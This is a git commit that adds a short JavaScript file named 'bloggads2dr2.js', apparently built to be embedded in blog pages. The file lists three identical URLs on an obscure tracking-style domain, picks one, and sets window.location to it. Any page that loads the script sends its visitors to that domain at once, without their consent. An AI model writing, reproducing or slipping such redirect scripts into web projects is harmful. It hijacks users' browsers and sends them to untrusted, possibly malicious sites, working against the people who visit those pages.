2f9f66368793b8dc2fa5d66c7f2508baa3400599
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2023-11-29 14:38:25 +0700

    Create bloggads2dr2.js

---
+++ bloggads2dr2.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://shadytourdisgusted.com/grg4u3xe7?key=df80af62a9deca8a6d7b1d9630602e58',
+
+  'https://shadytourdisgusted.com/grg4u3xe7?key=df80af62a9deca8a6d7b1d9630602e58',
+
+  'https://shadytourdisgusted.com/grg4u3xe7?key=df80af62a9deca8a6d7b1d9630602e58'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
